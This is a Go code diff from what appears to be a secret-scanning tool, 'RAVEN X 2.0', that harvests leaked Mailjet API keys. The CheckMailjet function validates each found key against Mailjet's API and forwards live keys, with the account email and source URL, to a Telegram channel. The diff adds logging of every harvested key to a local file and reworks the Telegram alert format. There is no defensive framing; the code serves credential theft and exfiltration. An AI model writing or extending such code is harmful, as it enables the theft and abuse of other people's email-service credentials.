@@ -23,6 +23,8 @@ func (a *AWSScanner) CheckMailjet(key, sourceURL string) bool {
 	globalCounters.APIsFoundTotal++
 	globalCounters.mu.Unlock()
 
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "mailjet_found.txt")
+
 	req, err := http.NewRequest("GET", "https://api.mailjet.com/v3/REST/user", nil)
 	if err != nil {
 		return false
@@ -63,14 +65,8 @@ func (a *AWSScanner) CheckMailjet(key, sourceURL string) bool {
 	globalCounters.APIsValidated++
 	globalCounters.mu.Unlock()
 
-	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-✉️ <b>MAILJET LIVE KEY</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-📧 <b>Email:</b> %s
-🔗 <b>Source:</b> %s
-`, key, info, sourceURL)
+	msg := a.tgHit("✉️", "MAILJET", sourceURL) + fmt.Sprintf(
+		"\n🔑 <b>Key:</b> <code>%s</code>\n📧 <b>Email:</b> %s\n", key, info)
 	go a.sendTelegram(msg)
 	return true
 }
